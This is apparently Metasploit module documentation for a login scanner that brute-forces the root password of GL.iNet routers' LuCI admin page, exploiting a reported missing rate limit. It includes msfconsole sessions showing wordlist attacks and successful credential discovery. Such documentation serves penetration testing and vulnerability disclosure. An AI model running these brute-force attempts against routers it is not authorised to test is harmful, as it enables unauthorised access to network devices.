## Vulnerable Application

GL.iNet routers use the LuCI web interface (based on OpenWrt) for administrative access. The authentication
endpoint lacks rate limiting or account lockout mechanisms, making it vulnerable to unrestricted brute-force
attacks.

This module has been tested against the following GL.iNet models and firmware versions:
- GL-AXT1800 (Slate AX) - Firmware 4.2.0, 4.6.4, 4.6.8

The vulnerability (CVE-2025-67090) allows an unauthenticated attacker on the local network to perform unlimited
password attempts against the admin interface at `/cgi-bin/luci`.

### Installation

GL.iNet routers can be obtained from the vendor's website. Firmware can be downloaded from:
https://www.gl-inet.com/products/

For testing purposes, you can use a physical GL.iNet router or install the firmware on compatible OpenWrt hardware.

### Default Credentials

GL.iNet routers typically require the user to set a password during initial setup. Some models may use:
- Username: `root`
- Password: Set by user during first boot (no default password in recent firmware)

Older firmware versions or factory resets may have default credentials - consult vendor documentation.

## Verification Steps

1. Connect to a GL.iNet router network or have network access to the router's IP
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/glinet_luci_login`
4. Do: `set RHOSTS [router IP]`
5. Do: `set USERNAME root`
6. Do: `set PASSWORD [known password]` or `set PASS_FILE [wordlist path]`
7. Do: `run`
8. If credentials are valid, you should see a success message

## Options

### USERNAME

Username for authentication. Default: `root`

GL.iNet routers use `root` as the administrative username. This is standard for OpenWrt-based systems.

## Scenarios

### Successful Login with Known Password

```
msf6 > use auxiliary/scanner/http/glinet_luci_login
msf6 auxiliary(scanner/http/glinet_luci_login) > set RHOSTS 192.168.8.1
RHOSTS => 192.168.8.1
msf6 auxiliary(scanner/http/glinet_luci_login) > set USERNAME root
USERNAME => root
msf6 auxiliary(scanner/http/glinet_luci_login) > set PASSWORD testpassword123
PASSWORD => testpassword123
msf6 auxiliary(scanner/http/glinet_luci_login) > run

[+] 192.168.8.1:80 - Success: 'root:testpassword123'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/glinet_luci_login) >
```

### Failed Login Attempt

```
msf6 auxiliary(scanner/http/glinet_luci_login) > set PASSWORD wrongpassword
PASSWORD => wrongpassword
msf6 auxiliary(scanner/http/glinet_luci_login) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/http/glinet_luci_login) > run

[-] 192.168.8.1:80 - Failed: 'root:wrongpassword'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/glinet_luci_login) >
```

### Brute Force with Wordlist

```
msf6 auxiliary(scanner/http/glinet_luci_login) > set PASS_FILE /usr/share/wordlists/passwords.txt
PASS_FILE => /usr/share/wordlists/passwords.txt
msf6 auxiliary(scanner/http/glinet_luci_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/http/glinet_luci_login) > run

[-] 192.168.8.1:80 - Failed: 'root:admin'
[-] 192.168.8.1:80 - Failed: 'root:password'
[-] 192.168.8.1:80 - Failed: 'root:12345'
[+] 192.168.8.1:80 - Success: 'root:router123'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/glinet_luci_login) >
```

### Testing Against HTTPS (Port 443)

```
msf6 auxiliary(scanner/http/glinet_luci_login) > set RHOSTS 192.168.8.1
RHOSTS => 192.168.8.1
msf6 auxiliary(scanner/http/glinet_luci_login) > set RPORT 443
RPORT => 443
msf6 auxiliary(scanner/http/glinet_luci_login) > set SSL true
SSL => true
msf6 auxiliary(scanner/http/glinet_luci_login) > set PASSWORD testpassword123
PASSWORD => testpassword123
msf6 auxiliary(scanner/http/glinet_luci_login) > run

[+] 192.168.8.1:443 - Success: 'root:testpassword123'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/glinet_luci_login) >
```
